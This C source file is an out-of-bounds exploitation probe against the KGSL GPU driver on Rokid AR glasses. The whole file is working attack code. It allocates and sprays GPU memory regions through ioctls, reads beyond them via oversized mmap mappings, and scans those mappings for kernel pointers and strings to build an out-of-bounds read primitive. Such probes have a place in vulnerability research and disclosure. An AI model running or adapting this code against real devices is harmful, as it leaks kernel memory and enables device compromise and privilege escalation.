/*
 * KGSL GPU Memory mmap OOB (Out-of-Bounds) Exploit Probe
 * =======================================================
 *
 * Key Discovery:
 * - Requesting 4KB allocation results in 768KB mmapsize
 * - This is a 192x oversized mapping!
 * - If consecutive allocations are contiguous in physical memory,
 *   we can read/write beyond our allocated region
 *
 * Attack Strategy:
 * 1. Allocate two adjacent GPU memory regions
 * 2. Write pattern to second region
 * 3. Try to read pattern through first region's oversized mapping
 * 4. If successful, we have an OOB primitive
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <signal.h>
#include <setjmp.h>

#define KGSL_IOC_TYPE 0x09

// Structures
struct kgsl_gpumem_alloc_id
{
    unsigned int id;
    unsigned int flags;
    size_t size;
    size_t mmapsize;
    uint64_t gpuaddr;
};

struct kgsl_gpumem_free_id
{
    unsigned int id;
    unsigned int pad;
};

struct kgsl_gpumem_get_info
{
    uint64_t gpuaddr;
    unsigned int id;
    unsigned int flags;
    size_t size;
    size_t mmapsize;
    uint64_t useraddr;
};

// IOCTLs
#define IOCTL_KGSL_GPUMEM_ALLOC_ID _IOWR(KGSL_IOC_TYPE, 0x2F, struct kgsl_gpumem_alloc_id)
#define IOCTL_KGSL_GPUMEM_FREE_ID _IOW(KGSL_IOC_TYPE, 0x30, struct kgsl_gpumem_free_id)
#define IOCTL_KGSL_GPUMEM_GET_INFO _IOWR(KGSL_IOC_TYPE, 0x36, struct kgsl_gpumem_get_info)

#define KGSL_MEMALIGN_SHIFT 16

static int g_kgsl_fd = -1;
static sigjmp_buf g_jmpbuf;
static volatile sig_atomic_t g_fault_count = 0;

void sigfault_handler(int sig)
{
    g_fault_count++;
    siglongjmp(g_jmpbuf, 1);
}

void setup_fault_handler(void)
{
    struct sigaction sa;
    sa.sa_handler = sigfault_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);
}

void hexdump(const void *data, size_t size)
{
    const unsigned char *p = (const unsigned char *)data;
    for (size_t i = 0; i < size; i++)
    {
        if (i % 16 == 0)
            printf("    %04zx: ", i);
        printf("%02x ", p[i]);
        if ((i + 1) % 16 == 0)
            printf("\n");
    }
    if (size % 16 != 0)
        printf("\n");
}

// ═══════════════════════════════════════════════════════════════════════════
// OOB Test 1: Simple Adjacent Allocation
// ═══════════════════════════════════════════════════════════════════════════

void test_oob_simple(void)
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════════╗\n");
    printf("║  TEST 1: Simple Adjacent OOB Read                                 ║\n");
    printf("╚═══════════════════════════════════════════════════════════════════╝\n\n");

    printf("[*] Allocating two 4KB GPU memory regions...\n");

    // Allocate first region
    struct kgsl_gpumem_alloc_id alloc1 = {
        .flags = (12 << KGSL_MEMALIGN_SHIFT),
        .size = 4096,
    };

    if (ioctl(g_kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC_ID, &alloc1) != 0)
    {
        printf("[-] First allocation failed: %s\n", strerror(errno));
        return;
    }

    printf("    Alloc 1: id=%u, size=%zu, mmapsize=%zu\n",
           alloc1.id, alloc1.size, alloc1.mmapsize);

    // Allocate second region
    struct kgsl_gpumem_alloc_id alloc2 = {
        .flags = (12 << KGSL_MEMALIGN_SHIFT),
        .size = 4096,
    };

    if (ioctl(g_kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC_ID, &alloc2) != 0)
    {
        printf("[-] Second allocation failed: %s\n", strerror(errno));
        struct kgsl_gpumem_free_id free1 = {.id = alloc1.id};
        ioctl(g_kgsl_fd, IOCTL_KGSL_GPUMEM_FREE_ID, &free1);
        return;
    }

    printf("    Alloc 2: id=%u, size=%zu, mmapsize=%zu\n",
           alloc2.id, alloc2.size, alloc2.mmapsize);
    printf("    ID Delta: %u\n", alloc2.id - alloc1.id);

    // Map first region
    off_t offset1 = (off_t)alloc1.id << 12;
    void *ptr1 = mmap(NULL, alloc1.mmapsize, PROT_READ | PROT_WRITE,
                      MAP_SHARED, g_kgsl_fd, offset1);

    if (ptr1 == MAP_FAILED)
    {
        printf("[-] First mmap failed: %s\n", strerror(errno));
        struct kgsl_gpumem_free_id free1 = {.id = alloc1.id};
        struct kgsl_gpumem_free_id free2 = {.id = alloc2.id};
        ioctl(g_kgsl_fd, IOCTL_KGSL_GPUMEM_FREE_ID, &free1);
        ioctl(g_kgsl_fd, IOCTL_KGSL_GPUMEM_FREE_ID, &free2);
        return;
    }

    printf("[+] First region mapped at: %p\n", ptr1);

    // Map second region
    off_t offset2 = (off_t)alloc2.id << 12;
    void *ptr2 = mmap(NULL, alloc2.mmapsize, PROT_READ | PROT_WRITE,
                      MAP_SHARED, g_kgsl_fd, offset2);

    if (ptr2 == MAP_FAILED)
    {
        printf("[-] Second mmap failed: %s\n", strerror(errno));
        munmap(ptr1, alloc1.mmapsize);
        struct kgsl_gpumem_free_id free1 = {.id = alloc1.id};
        struct kgsl_gpumem_free_id free2 = {.id = alloc2.id};
        ioctl(g_kgsl_fd, IOCTL_KGSL_GPUMEM_FREE_ID, &free1);
        ioctl(g_kgsl_fd, IOCTL_KGSL_GPUMEM_FREE_ID, &free2);
        return;
    }

    printf("[+] Second region mapped at: %p\n", ptr2);

    // Write pattern to second region
    printf("\n[*] Writing pattern 0xDEADBEEF to second region...\n");
    uint32_t *p2 = (uint32_t *)ptr2;
    for (int i = 0; i < 1024; i++)
    { // First 4KB
        p2[i] = 0xDEADBEEF;
    }
    __sync_synchronize();

    // Now scan through first region's oversized mapping
    printf("[*] Scanning first region's mapping for pattern...\n");
    printf("    mmapsize = %zu bytes (%zu KB)\n", alloc1.mmapsize, alloc1.mmapsize / 1024);
    printf("    Scanning beyond allocated 4KB...\n\n");

    uint32_t *p1 = (uint32_t *)ptr1;
    int pattern_found = 0;
    size_t found_offset = 0;

    // Scan with fault protection
    for (size_t offset = 4096; offset < alloc1.mmapsize; offset += 4096)
    {
        if (sigsetjmp(g_jmpbuf, 1) == 0)
        {
            uint32_t val = *(volatile uint32_t *)((char *)ptr1 + offset);

            if (val == 0xDEADBEEF)
            {
                pattern_found = 1;
                found_offset = offset;
                printf("    [!] PATTERN FOUND at offset 0x%zx (%zu KB)!\n",
                       offset, offset / 1024);

                // Read more to confirm
                printf("    Data at offset 0x%zx:\n", offset);
                hexdump((char *)ptr1 + offset, 64);
                break;
            }
            else if (offset < 8192)
            {
                // Print first few pages for analysis
                printf("    Offset 0x%04zx: 0x%08x\n", offset, val);
            }
        }
        else
        {
            printf("    Offset 0x%zx: FAULT (end of accessible region)\n", offset);
            break;
        }
    }

    if (pattern_found)
    {
        printf("\n[!!!] OOB READ CONFIRMED!\n");
        printf("      We can read beyond our allocation through the oversized mapping!\n");
        printf("      Found second allocation's data at offset %zu in first mapping\n",
               found_offset);
    }
    else
    {
        printf("\n[-] Pattern not found in accessible range\n");
        printf("    Possible reasons:\n");
        printf("    - Allocations not contiguous in physical memory\n");
        printf("    - mmap size is virtual, not physical OOB\n");
        printf("    - Pattern overwrites not visible due to caching\n");
    }

    // Cleanup
    munmap(ptr1, alloc1.mmapsize);
    munmap(ptr2, alloc2.mmapsize);
    struct kgsl_gpumem_free_id free1 = {.id = alloc1.id};
    struct kgsl_gpumem_free_id free2 = {.id = alloc2.id};
    ioctl(g_kgsl_fd, IOCTL_KGSL_GPUMEM_FREE_ID, &free1);
    ioctl(g_kgsl_fd, IOCTL_KGSL_GPUMEM_FREE_ID, &free2);
}

// ═══════════════════════════════════════════════════════════════════════════
// OOB Test 2: Many Allocations with Spray
// ═══════════════════════════════════════════════════════════════════════════

void test_oob_spray(void)
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════════╗\n");
    printf("║  TEST 2: Spray Allocations for Contiguity                         ║\n");
    printf("╚═══════════════════════════════════════════════════════════════════╝\n\n");

#define SPRAY_COUNT 16

    printf("[*] Allocating %d consecutive 4KB regions...\n", SPRAY_COUNT);

    struct
    {
        unsigned int id;
        void *ptr;
        size_t mmapsize;
    } allocs[SPRAY_COUNT];

    int count = 0;

    for (int i = 0; i < SPRAY_COUNT; i++)
    {
        struct kgsl_gpumem_alloc_id alloc = {
            .flags = (12 << KGSL_MEMALIGN_SHIFT),
            .size = 4096,
        };

        if (ioctl(g_kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC_ID, &alloc) != 0)
        {
            printf("[-] Allocation %d failed\n", i);
            break;
        }

        off_t offset = (off_t)alloc.id << 12;
        void *ptr = mmap(NULL, alloc.mmapsize, PROT_READ | PROT_WRITE,
                         MAP_SHARED, g_kgsl_fd, offset);

        if (ptr == MAP_FAILED)
        {
            struct kgsl_gpumem_free_id req = {.id = alloc.id};
            ioctl(g_kgsl_fd, IOCTL_KGSL_GPUMEM_FREE_ID, &req);
            printf("[-] mmap %d failed\n", i);
            break;
        }

        allocs[count].id = alloc.id;
        allocs[count].ptr = ptr;
        allocs[count].mmapsize = alloc.mmapsize;
        count++;

        printf("    Alloc %2d: id=%8u, ptr=%p\n", i, alloc.id, ptr);
    }

    printf("[+] Allocated and mapped %d regions\n\n", count);

    // Write unique patterns to each region
    printf("[*] Writing unique patterns to each region...\n");
    for (int i = 0; i < count; i++)
    {
        uint32_t *p = (uint32_t *)allocs[i].ptr;
        uint32_t pattern = 0xBEEF0000 | i;
        for (int j = 0; j < 1024; j++)
        {
            p[j] = pattern;
        }
    }
    __sync_synchronize();

    // Try to read other regions through each mapping
    printf("[*] Testing cross-read through oversized mappings...\n\n");

    for (int i = 0; i < count && i < 4; i++)
    { // Test first 4
        printf("[Region %d] Scanning for patterns from other regions...\n", i);

        for (size_t offset = 4096; offset < allocs[i].mmapsize && offset < 32768; offset += 4096)
        {
            if (sigsetjmp(g_jmpbuf, 1) == 0)
            {
                uint32_t val = *(volatile uint32_t *)((char *)allocs[i].ptr + offset);

                // Check if it matches any of our patterns
                if ((val & 0xFFFF0000) == 0xBEEF0000)
                {
                    int found_region = val & 0xFFFF;
                    printf("    [!] At offset 0x%05zx: Found region %d's pattern!\n",
                           offset, found_region);
                }
                else if (offset < 8192)
                {
                    printf("    Offset 0x%04zx: 0x%08x\n", offset, val);
                }
            }
            else
            {
                printf("    Offset 0x%zx: FAULT\n", offset);
                break;
            }
        }
    }

    // Cleanup
    printf("\n[*] Cleaning up...\n");
    for (int i = 0; i < count; i++)
    {
        munmap(allocs[i].ptr, allocs[i].mmapsize);
        struct kgsl_gpumem_free_id req = {.id = allocs[i].id};
        ioctl(g_kgsl_fd, IOCTL_KGSL_GPUMEM_FREE_ID, &req);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// OOB Test 3: Analyze mmap Behavior
// ═══════════════════════════════════════════════════════════════════════════

void test_mmap_behavior(void)
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════════╗\n");
    printf("║  TEST 3: Analyze mmap Behavior and Limits                         ║\n");
    printf("╚═══════════════════════════════════════════════════════════════════╝\n\n");

    printf("[*] Testing different mmap sizes for same allocation...\n\n");

    struct kgsl_gpumem_alloc_id alloc = {
        .flags = (12 << KGSL_MEMALIGN_SHIFT),
        .size = 4096,
    };

    if (ioctl(g_kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC_ID, &alloc) != 0)
    {
        printf("[-] Allocation failed: %s\n", strerror(errno));
        return;
    }

    printf("    Allocated: id=%u, size=%zu, mmapsize=%zu\n",
           alloc.id, alloc.size, alloc.mmapsize);

    off_t offset = (off_t)alloc.id << 12;

    // Try different mmap sizes
    size_t sizes[] = {4096, 8192, 16384, 65536, 262144, 786432, 1048576, 4194304};

    for (int i = 0; i < sizeof(sizes) / sizeof(sizes[0]); i++)
    {
        void *ptr = mmap(NULL, sizes[i], PROT_READ | PROT_WRITE,
                         MAP_SHARED, g_kgsl_fd, offset);

        if (ptr == MAP_FAILED)
        {
            printf("    mmap size=%7zu: FAILED (%s)\n", sizes[i], strerror(errno));
        }
        else
        {
            printf("    mmap size=%7zu: SUCCESS at %p", sizes[i], ptr);

            // Test accessibility
            int accessible = 0;
            if (sigsetjmp(g_jmpbuf, 1) == 0)
            {
                // Try to access last byte
                volatile char c = *((char *)ptr + sizes[i] - 1);
                (void)c;
                accessible = 1;
            }

            printf(" - Last byte: %s\n", accessible ? "ACCESSIBLE" : "FAULT");
            munmap(ptr, sizes[i]);
        }
    }

    printf("\n[*] Testing access at page boundaries with full mmapsize...\n");

    void *ptr = mmap(NULL, alloc.mmapsize, PROT_READ | PROT_WRITE,
                     MAP_SHARED, g_kgsl_fd, offset);

    if (ptr != MAP_FAILED)
    {
        printf("    Mapped %zu bytes at %p\n", alloc.mmapsize, ptr);

        // Write pattern at start
        *(uint32_t *)ptr = 0xCAFEBABE;

        // Scan every 4KB page
        for (size_t off = 0; off < alloc.mmapsize; off += 4096)
        {
            if (sigsetjmp(g_jmpbuf, 1) == 0)
            {
                uint32_t val = *(volatile uint32_t *)((char *)ptr + off);

                if (off == 0)
                {
                    printf("    Page %3zu (0x%06zx): 0x%08x (our pattern)\n",
                           off / 4096, off, val);
                }
                else if (val != 0)
                {
                    printf("    Page %3zu (0x%06zx): 0x%08x (NON-ZERO!)\n",
                           off / 4096, off, val);
                }
            }
            else
            {
                printf("    Page %3zu (0x%06zx): FAULT - boundary at %zu KB\n",
                       off / 4096, off, off / 1024);
                break;
            }
        }

        munmap(ptr, alloc.mmapsize);
    }

    struct kgsl_gpumem_free_id req = {.id = alloc.id};
    ioctl(g_kgsl_fd, IOCTL_KGSL_GPUMEM_FREE_ID, &req);
}

// ═══════════════════════════════════════════════════════════════════════════
// OOB Test 4: Look for Kernel Data
// ═══════════════════════════════════════════════════════════════════════════

void test_kernel_data_leak(void)
{
    printf("\n");
    printf("╔═══════════════════════════════════════════════════════════════════╗\n");
    printf("║  TEST 4: Scan for Potential Kernel Data in Mapping                ║\n");
    printf("╚═══════════════════════════════════════════════════════════════════╝\n\n");

    struct kgsl_gpumem_alloc_id alloc = {
        .flags = (12 << KGSL_MEMALIGN_SHIFT),
        .size = 4096,
    };

    if (ioctl(g_kgsl_fd, IOCTL_KGSL_GPUMEM_ALLOC_ID, &alloc) != 0)
    {
        printf("[-] Allocation failed\n");
        return;
    }

    off_t offset = (off_t)alloc.id << 12;
    void *ptr = mmap(NULL, alloc.mmapsize, PROT_READ | PROT_WRITE,
                     MAP_SHARED, g_kgsl_fd, offset);

    if (ptr == MAP_FAILED)
    {
        printf("[-] mmap failed\n");
        struct kgsl_gpumem_free_id req = {.id = alloc.id};
        ioctl(g_kgsl_fd, IOCTL_KGSL_GPUMEM_FREE_ID, &req);
        return;
    }

    printf("[*] Scanning mapping for interesting patterns...\n");
    printf("    Looking for: kernel pointers, ASCII strings, structures\n\n");

    int kernel_ptr_count = 0;
    int string_count = 0;

    for (size_t off = 0; off < alloc.mmapsize; off += 8)
    {
        if (sigsetjmp(g_jmpbuf, 1) != 0)
        {
            printf("\n[*] Reached end of accessible region at offset 0x%zx\n", off);
            break;
        }

        uint64_t val = *(volatile uint64_t *)((char *)ptr + off);

        // Check for kernel pointer patterns (0xffff...)
        if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL)
        {
            kernel_ptr_count++;
            if (kernel_ptr_count <= 10)
            {
                printf("    [!] Potential kernel ptr at 0x%06zx: 0x%016llx\n",
                       off, (unsigned long long)val);
            }
        }

        // Check for ASCII strings (printable chars)
        char *s = (char *)ptr + off;
        int printable = 1;
        for (int i = 0; i < 4; i++)
        {
            if (s[i] < 0x20 || s[i] > 0x7e)
            {
                printable = 0;
                break;
            }
        }
        if (printable && s[0] != 0)
        {
            string_count++;
            if (string_count <= 10)
            {
                printf("    [S] Possible string at 0x%06zx: \"%.16s...\"\n", off, s);
            }
        }
    }

    printf("\n[*] Summary:\n");
    printf("    Potential kernel pointers: %d\n", kernel_ptr_count);
    printf("    Possible ASCII strings:    %d\n", string_count);

    munmap(ptr, alloc.mmapsize);
    struct kgsl_gpumem_free_id req = {.id = alloc.id};
    ioctl(g_kgsl_fd, IOCTL_KGSL_GPUMEM_FREE_ID, &req);
}

// ═══════════════════════════════════════════════════════════════════════════
// Main
// ═══════════════════════════════════════════════════════════════════════════

int main(int argc, char **argv)
{
    printf("\n");
    printf("╔════════════════════════════════════════════════════════════════════╗\n");
    printf("║  KGSL GPU Memory mmap OOB Exploitation Probe                       ║\n");
    printf("║  Target: Rokid AR Glasses                                          ║\n");
    printf("╚════════════════════════════════════════════════════════════════════╝\n\n");

    printf("[*] UID=%d, EUID=%d\n", getuid(), geteuid());

    setup_fault_handler();

    g_kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (g_kgsl_fd < 0)
    {
        printf("[-] Failed to open /dev/kgsl-3d0: %s\n", strerror(errno));
        return 1;
    }
    printf("[+] Opened /dev/kgsl-3d0 (fd=%d)\n", g_kgsl_fd);

    test_oob_simple();
    test_oob_spray();
    test_mmap_behavior();
    test_kernel_data_leak();

    close(g_kgsl_fd);

    printf("\n[*] OOB probe complete. Faults recovered: %d\n\n", g_fault_count);

    return 0;
}
